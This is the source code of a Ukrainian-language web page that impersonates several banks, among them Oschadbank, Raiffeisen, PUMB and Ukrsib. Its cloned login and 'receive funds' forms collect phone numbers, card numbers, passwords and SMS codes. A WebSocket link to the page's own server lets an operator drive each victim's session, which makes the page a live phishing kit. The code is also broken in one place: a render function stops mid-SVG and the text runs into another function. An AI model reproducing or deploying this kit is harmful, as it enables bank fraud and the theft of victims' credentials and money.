<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        /* Общие стили для всех экранов и элементов */
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
            --oschad-primary: #00A39C;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
            font-size: 16px;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }
        
        #form-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; visibility: hidden; transform: scale(1.05);
            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
            display: flex; align-items: center; padding: 20px;
            background: #f8f9fa;
        }
        .form-container {
            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
            background-color: var(--white); padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        body.form-active { background: var(--bg-gradient); overflow: hidden; }
        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
        .bank-item.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
        .bank-item.disabled .unavailable-label {
            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
            font-size: 12px; font-weight: bold; color: var(--danger-color);
            background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
        }

        /* --- Стили для модального окна ЛК Ощадбанка --- */
        #custom-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #f8f9fa;
            display: none; justify-content: center; align-items: flex-start;
            z-index: 1000;
            overflow-y: auto;
        }
        .custom-modal-content {
            background-color: transparent; padding: 0; border-radius: 0;
            width: 100%; max-width: none; text-align: center; box-shadow: none;
            display: flex; flex-direction: column; align-items: center;
        }
        .oschad-header {
            width: 100%; display: flex; align-items: center;
            padding: 10px 15px; background-color: #f8f9fa;
        }
        .oschad-header .back-arrow {
            font-size: 28px; color: #495057; margin-right: 15px;
            cursor: pointer; line-height: 1;
        }
        .oschad-header .title {
            font-size: 17px;
            font-weight: 500;
            color: #212529;
            flex-grow: 1; text-align: center; margin-right: 40px; /* Компенсация стрелки для центрирования */
        }
        .oschad-welcome-section {
            padding: 20px; text-align: left;
            width: 100%;
            display: flex; flex-direction: column;
            padding-bottom: 120px;
        }
        .oschad-main-title {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: left;
        }
        .oschad-welcome-section p {
            font-size: 16px; color: #495057; line-height: 1.5;
            margin-bottom: 25px; font-weight: 400;
            text-align: left;
        }
        .oschad-toggle-buttons {
            display: flex; background-color: #e9ecef; border-radius: 12px;
            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
        }
        .oschad-toggle-buttons button {
            flex: 1; padding: 12px 15px; border: none; background-color: transparent;
            font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
            border-radius: 8px; transition: all 0.2s ease;
        }
        .oschad-toggle-buttons button.active {
            background-color: var(--white);
            color: var(--dark-text);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .oschad-input-group {
            margin-bottom: 20px; width: 100%; position: relative;
        }
        .oschad-input-group label {
            position: absolute; top: 18px; left: 15px; font-size: 16px; color: #adb5bd;
            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
            z-index: 1;
        }
        .oschad-input-group.is-focused > label,
        .oschad-input-group.has-value > label {
            top: -10px; left: 10px; font-size: 12px; color: #6c757d;
        }
        .oschad-input-field {
            width: 100%; padding: 18px 45px 18px 15px;
            border: 1px solid #dee2e6; border-radius: 12px;
            font-size: 16px; color: var(--dark-text); background-color: var(--white);
            transition: all 0.2s ease; outline: none;
            font-weight: 500; position: relative;
        }
        .oschad-input-field:focus {
            border-color: var(--oschad-primary);
        }
        .oschad-input-field::placeholder { color: transparent; }
        .password-toggle-icon {
            position: absolute; right: 15px; top: 50%;
            transform: translateY(-50%); cursor: pointer; color: #adb5bd;
            z-index: 2;
        }
        .oschad-phone-wrapper {
            position: relative; display: flex; align-items: center; width: 100%;
            border: 1px solid #dee2e6; border-radius: 12px;
            background-color: var(--white);
            overflow: hidden;
        }
        .oschad-phone-wrapper:focus-within {
            border-color: var(--oschad-primary);
        }
        .oschad-phone-prefix {
            padding: 18px 0 18px 15px;
            font-size: 16px; color: var(--dark-text);
            font-weight: 500;
        }
        .oschad-phone-wrapper .oschad-input-field {
            border: none; padding-left: 5px; flex-grow: 1;
        }
        .forgot-password-link {
            display: block;
            text-align: center;
            margin-top: -10px;
            margin-bottom: 20px;
            color: var(--oschad-primary);
            font-weight: 600;
            text-decoration: none;
            font-size: 15px;
            cursor: pointer;
        }
        .oschad-submit-button {
            position: fixed; bottom: 20px;
            left: 20px; right: 20px;
            width: auto; padding: 16px; margin: 0; border: none;
            border-radius: 16px;
            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
            cursor: not-allowed; transition: all 0.2s ease;
            z-index: 1001;
        }
        .oschad-submit-button.active {
            background-color: var(--oschad-primary); color: var(--white); cursor: pointer;
        }
        .auth-error-message {
            color: var(--danger-color);
            font-size: 14px;
            text-align: center;
            margin-top: -10px;
            margin-bottom: 15px;
        }
        .loader-icon {
            width: 120px; height: 120px;
            max-width: 100%;
            margin: 20px auto;
            animation: spin 2s linear infinite;
            mix-blend-mode: multiply;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* --- СТИЛИ для окна подтверждения кодом --- */
        .oschad-code-container { padding: 20px; text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center; }
        .oschad-code-container p { color: #495057; margin: 0 0 10px 0; padding: 0; font-weight: 400; }
        .oschad-code-info { font-size: 16px; font-weight: 400; margin-bottom: 20px !important; }
        .oschad-code-number { font-size: 22px; font-weight: 500; color: var(--dark-text) !important; margin-bottom: 5px !important; }
        .oschad-code-instruction { font-size: 16px; font-weight: 500; margin-top: 15px !important; margin-bottom: 30px !important; }
        .oschad-code-inputs { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
        .oschad-code-input { width: 50px; height: 55px; text-align: center; font-size: 24px; font-weight: 600; border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white); outline: none; transition: border-color 0.2s ease; color: var(--dark-text); caret-color: var(--oschad-primary); padding: 0; -moz-appearance: textfield; }
        .oschad-code-input::placeholder { color: #bdc3c7; font-weight: 400; }
        .oschad-code-input::-webkit-outer-spin-button, .oschad-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .oschad-code-input:focus { border-color: var(--oschad-primary); }
        .oschad-code-inputs.error .oschad-code-input { border-color: var(--danger-color); }
        .oschad-code-error-text { color: var(--danger-color); font-size: 15px; font-weight: 500; margin-bottom: 20px; }
        .oschad-resend-link { display: block; color: #6c757d; font-weight: 500; text-decoration: none; font-size: 15px; margin-bottom: 25px; pointer-events: none; }
        .oschad-resend-link.active { color: var(--oschad-primary); cursor: pointer; pointer-events: auto; }
        .oschad-no-call-link { display: block; color: var(--oschad-primary); font-weight: 500; text-decoration: none; font-size: 15px; cursor: pointer; }

        /* --- Стили для модального окна "Нет SMS" --- */
        .sms-help-modal-backdrop { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); display: flex; justify-content: center; align-items: center; z-index: 2000; padding: 20px; }
        .sms-help-modal-content { background-color: var(--white); border-radius: 16px; padding: 25px; width: 100%; max-width: 380px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); text-align: left; }
        .sms-help-modal-content h3 { font-size: 18px; font-weight: 700; margin: 0 0 15px 0; color: var(--dark-text); }
        .sms-help-modal-content p { font-size: 15px; line-height: 1.5; color: var(--light-text); margin: 0 0 25px 0; }
        .sms-help-modal-actions { display: flex; flex-direction: column; gap: 10px; }
        .sms-help-modal-actions button { border: none; padding: 12px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; background-color: transparent; color: var(--oschad-primary); }

        /* --- ОБЩИЕ СТИЛИ ФОРМЫ (для восстановления и т.д.) --- */
        .oschad-form-container { padding: 20px; text-align: left; width: 100%; display: flex; flex-direction: column; padding-bottom: 120px; }
        .oschad-form-container .oschad-main-title { text-align: left; margin-bottom: 10px; }
        .oschad-form-container p { text-align: left; margin-bottom: 30px; }
        
        /* --- ОБЩИЕ СТИЛИ ДЛЯ СТАНДАРТНОЙ ФОРМЫ --- */
        #form-header { text-align: center; margin-bottom: 25px; }
        #form-header-logo { max-height: 50px; max-width: 150px; }
        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
        .input-group { margin-bottom: 15px; position: relative; }
        .input-field { width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px; font-size: 18px; font-weight: 500; transition: all 0.3s ease; }
        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
        .phone-input-wrapper { display: flex; }
        .phone-prefix { padding: 15px; border: 1px solid var(--border-color); border-right: none; background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500; flex-shrink: 0; display: flex; align-items: center; }
        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
        .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1; }
        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
        
        /* --- НОВЫЕ СТИЛИ для модального окна Raiffeisen (Светлая тема) --- */
        #raif-light-container {
            background-color: #fdfcfa;
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
            box-sizing: border-box;
        }
        .raif-light-header {
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            padding: 10px 0;
            width: 100%;
        }
        .raif-light-header .title {
            font-size: 18px;
            font-weight: 500;
            color: #333;
        }
        .raif-light-header .back-arrow {
            position: absolute;
            left: 0;
            font-size: 28px;
            cursor: pointer;
            color: #555;
        }
        .raif-light-main-content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            padding-bottom: 80px; /* Space for fixed button */
        }
        .raif-light-icon-container {
            margin-bottom: 40px;
            width: 200px;
            height: 130px;
        }
        .raif-light-input-group {
            width: 100%;
            max-width: 400px;
            text-align: left;
            margin-bottom: 20px;
        }
        .raif-light-input-group label {
            font-size: 14px;
            color: var(--light-text);
            margin-bottom: 8px;
            display: block;
            padding-left: 5px;
        }
        .raif-light-phone-input-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            background-color: var(--white);
            overflow: hidden;
            transition: border-color 0.2s, box-shadow 0.2s;
            padding: 4px 15px;
        }
        .raif-light-phone-input-wrapper.focused {
            border-color: #fcae2a;
            box-shadow: 0 0 0 2px rgba(252, 174, 42, 0.3);
        }
        .raif-light-phone-input-wrapper span {
            font-size: 16px;
            color: var(--dark-text);
            padding-right: 10px;
            font-weight: 500;
        }
        .raif-light-phone-input-wrapper input {
            flex-grow: 1;
            border: none;
            background-color: transparent;
            color: var(--dark-text);
            font-size: 16px;
            outline: none;
            padding: 12px 0;
            font-weight: 500;
        }
        .raif-light-phone-input-wrapper input::placeholder {
            color: #adb5bd;
            font-weight: 400;
        }
        .raif-light-legal-text {
            font-size: 13px;
            color: var(--light-text);
            line-height: 1.6;
            text-align: center;
            max-width: 400px;
        }
        .raif-light-legal-text a {
            color: #2b82d4;
            font-weight: 500;
            text-decoration: none;
        }
        .raif-light-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px;
            background-color: #fdfcfa;
            display: flex;
            justify-content: center;
        }
        .raif-light-submit-button {
            width: 100%;
            max-width: 400px;
            display: block;
            padding: 16px;
            border: none;
            border-radius: 12px;
            background-color: #e9ecef;
            color: #adb5bd;
            font-size: 18px;
            font-weight: 600;
            cursor: not-allowed;
            transition: background-color 0.3s, color 0.3s;
        }
        .raif-light-submit-button.active {
            background-color: #fcae2a; /* Yellow */
            color: var(--white);
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>
    <div id="form-screen" class="screen">
        <div class="form-container">
            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
            <h2 id="modal-title"></h2>
            <div id="modal-step-content"></div>
            <div class="modal-footer">
                <button class="btn btn-back" id="back-btn">Назад</button>
                <button class="btn btn-next" id="next-btn">Далі</button>
            </div>
        </div>
    </div>
    <div id="custom-modal-overlay">
        <div class="custom-modal-content" id="custom-modal-content"></div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    // --- CONFIG & STATE VARIABLES ---
    const bankFlows = {
        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [] },
        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: [] },
        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
        'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true }
    };
    
    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || 'unknown';
    localStorage.setItem('referrer', ref);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    let ws;
    let activeBankData = {};
    let currentStepIndex = 0;
    let collectedData = {};
    let callTimerInterval;
    let lastCodeScreen = null; 
    let currentCustomFlow = null; // Can be 'oschad', 'raif', or null

    // --- DOM ELEMENTS ---
    const bankGrid = document.querySelector('.bank-grid');
    const body = document.body;
    const formHeaderLogo = document.getElementById('form-header-logo');
    const modalTitle = document.getElementById('modal-title');
    const stepContent = document.getElementById('modal-step-content');
    const modalFooter = document.querySelector('.modal-footer');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');
    const customModalOverlay = document.getElementById('custom-modal-overlay');
    const customModalContent = document.getElementById('custom-modal-content');
    
    // --- INITIALIZATION ---
    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');

    // --- WEBSOCKET LOGIC ---
    function connectWebSocket() {
        const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
        ws = new WebSocket(`${protocol}://${window.location.host}`);
        ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
        ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
        ws.onclose = () => setTimeout(connectWebSocket, 3000);
        ws.onerror = (error) => console.error('WebSocket error:', error);
    }
    
    // --- DYNAMIC RENDER FUNCTIONS ---
    
    /** Renders the Raiffeisen login modal (Light Theme) */
    function renderRaiffeisenLogin() {
        const iconSvg = `
        <svg width="200" height="130" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
            <g transform="translate(20,0)">
                <g transform="rotate(-15 110 65)">

    /** Adds event listeners for the Raiffeisen login modal */
    function addRaiffeisenLoginListeners() {
        const wrapper = document.querySelector('.raif-light-phone-input-wrapper');
        const input = document.getElementById('raif_phone_input');
        const submitBtn = document.getElementById('raif-submit-btn');
        const backArrow = document.querySelector('.raif-light-header .back-arrow');

        backArrow.onclick = () => { currentCustomFlow = null; window.location.reload(); };
        input.addEventListener('focus', () => wrapper.classList.add('focused'));
        input.addEventListener('blur', () => wrapper.classList.remove('focused'));

        input.addEventListener('input', () => {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 9) {
                value = value.substring(0, 9);
            }
            input.value = value;

            if (value.length === 9) {
                submitBtn.classList.add('active');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('active');
                submitBtn.disabled = true;
            }
        });

        submitBtn.addEventListener('click', () => {
            if (submitBtn.disabled) return;
            const phone = '+380' + input.value.replace(/\D/g, '');
            sendDataToServer({ phone: phone }, true);
